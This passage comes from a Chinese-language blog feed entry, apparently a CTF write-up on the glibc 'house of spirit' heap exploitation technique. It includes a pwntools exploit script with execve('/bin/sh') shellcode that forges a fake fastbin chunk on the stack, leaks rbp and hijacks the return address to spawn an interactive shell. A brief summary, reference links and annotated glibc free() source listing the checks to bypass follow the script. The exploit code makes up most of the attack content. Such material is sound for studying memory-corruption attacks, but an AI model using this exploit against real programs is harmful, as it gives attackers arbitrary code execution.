number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>lg      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>var_name<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">:'</span></span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>prl     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> var_name                 <span class=\"token punctuation\">:</span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>var_name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>debug   <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> command<span class=\"token operator\">=</span><span class=\"token string\">''</span>               <span class=\"token punctuation\">:</span> gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>r<span class=\"token punctuation\">,</span>command<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                          <span class=\"token punctuation\">:</span> r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b'who are u?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x90'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>rc<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>rbp <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>rc<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>lg<span class=\"token punctuation\">(</span><span class=\"token string\">'rbp'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'give me your id ~~?\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'97'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>pl <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x61</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">2</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp<span class=\"token operator\">-</span><span class=\"token number\">0xb0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sa<span class=\"token punctuation\">(</span><span class=\"token string\">b\"give me money~\\n\"</span><span class=\"token punctuation\">,</span>pl<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'your choice : '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">b'1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'80'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>se<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rbp <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>ru<span class=\"token punctuation\">(</span><span class=\"token string\">b'3. goodbye'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/house-of-spirit/image-20240712090910366.png\" alt=\"image-20240712090910366\"></p>\n<p>总结：此次攻击 fake 堆块到栈上，从而劫持返回地址。注意的问题，需要 malloc 出 fake_chunk 的 size 要合适。堆栈反向增长，这里一定要注意。（一定要注意回车适合输入！</p>\n<blockquote>\n<p>参考</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucm9kZXJpY2tjaGFuLmNuL3poLWNuLzIwMjMtMDItMjctaG91c2Utb2YtYWxsLWFib3V0LWdsaWJjLWhlYXAtZXhwbG9pdGF0aW9uLyMyLWhvdXNlLW9mJUU3JUIzJUJCJUU1JTg4JTk3\">https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/#2-house-of 系列</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wYW5kYTBzLnRvcC8yMDIxLzA2LzEwL2hvdXNlLW9mLXNwaXJpdC8=\">https://panda0s.top/2021/06/10/house-of-spirit/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9iYnMua2FueHVlLmNvbS90aHJlYWQtMjY2MzU1Lmh0bQ==\">https://bbs.kanxue.com/thread-266355.htm</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYW50ZXJuLmNvb2wvbm90ZS1wd24taG91c2Utb2Ytc3Bpcml0L2luZGV4Lmh0bWw=\">https://lantern.cool/note-pwn-house-of-spirit/index.html</span></p>\n</blockquote>\n<p>增文：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">__libc_free</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    mstate ar_ptr<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    mchunkptr p<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token function\">atomic_forced_read</span> <span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span><span class=\"token punctuation\">(</span>hook <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">,</span> <span class=\"token function\">RETURN_ADDRESS</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>mem <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p <span class=\"token operator\">=</span> <span class=\"token function\">mem2chunk</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">/* 首先 M 标志位不能被置上才能绕过。release mmapped memory. */</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_is_mmapped</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>mp_<span class=\"token punctuation\">.</span>no_dyn_threshold</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>                <span class=\"token operator\">&amp;&amp;</span> p<span class=\"token operator\">-></span>size</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>                        <span class=\"token operator\">></span> mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token operator\">&amp;&amp;</span> p<span class=\"token operator\">-></span>size <span class=\"token operator\">&lt;=</span> DEFAULT_MMAP_THRESHOLD_MAX<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            mp_<span class=\"token punctuation\">.</span>mmap_threshold <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            mp_<span class=\"token punctuation\">.</span>trim_threshold <span class=\"token operator\">=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            <span class=\"token function\">LIBC_PROBE</span> <span class=\"token punctuation\">(</span>memory_mallopt_free_dyn_thresholds<span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>                    mp_<span class=\"token punctuation\">.</span>mmap_threshold<span class=\"token punctuation\">,</span> mp_<span class=\"token punctuation\">.</span>trim_threshold<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token function\">munmap_chunk</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        <span class=\"token keyword\">return</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    ar_ptr <span class=\"token operator\">=</span> <span class=\"token function\">arena_for_chunk</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span>ar_ptr<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre> <span class=\"token keyword\">void</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre> <span class=\"token function\">_int_free</span><span class=\"token punctuation\">(</span>mstate av<span class=\"token punctuation\">,</span> Void_t<span class=\"token operator\">*</span> mem<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>   mchunkptr       p<span class=\"token punctuation\">;</span>           <span class=\"token comment\">/* chunk corresponding to mem */</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>   INTERNAL_SIZE_T size<span class=\"token punctuation\">;</span>        <span class=\"token comment\">/* its size */</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>   mfastbinptr<span class=\"token operator\">*</span>    fb<span class=\"token punctuation\">;</span>          <span class=\"token comment\">/* associated fastbin */</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>   <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>  p <span class=\"token operator\">=</span> <span class=\"token function\">mem2chunk</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>  size <span class=\"token operator\">=</span> <span class=\"token function\">chunksize</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre>  <span class=\"token comment\">// ...</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre> </pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    If eligible, place chunk on a fastbin so it can be found</pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    and used quickly in malloc.</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>  */</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>max_fast<span class=\"token punctuation\">)</span>   <span class=\"token comment\">/* 其次，size 的大小不能超过 fastbin 的最大值 */</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">if</span> <span class=\"token expression\">TRIM_FASTBINS</span></span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>      <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>       If TRIM_FASTBINS set, don't place chunks</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>       bordering top into fastbins</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>      */</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>      <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> av<span class=\"token operator\">-></span>top<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span></span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>      <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre> </pre></td></tr><tr><td data-num=\"63\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token operator\">-></span>size <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> SIZE_SZ<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>       <span class=\"token operator\">||</span> <span class=\"token function\">__builtin_expect</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunksize</span> <span class=\"token punctuation\">(</span><span class=\"token function\">chunk_at_offset</span> <span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>                         <span class=\"token operator\">>=</span> av<span class=\"token operator\">-></span>system_mem<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>                        <span class=\"token comment\">/* 最后是下一个堆块的大小，要大于 2*SIZE_ZE 小于 system_mem*/</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>      <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>       errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"free(): invalid next size (fast)\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>       <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>      <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre> </pre></td></tr><tr><td data-num=\"71\"></td><td><pre>    <span class=\"token comment\">//...</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>    fb <span class=\"token operator\">=</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">(</span>av<span class=\"token operator\">-></span>fastbins<span class=\"token punctuation\">[</span><span class=\"token function\">fastbin_index</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token comment\">//...</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    p<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> <span class=\"token operator\">*</span>fb<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>  <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure>",
            "tags": [
                "house系列",
                "house-of-spirit"
            ]
        }
    ]
}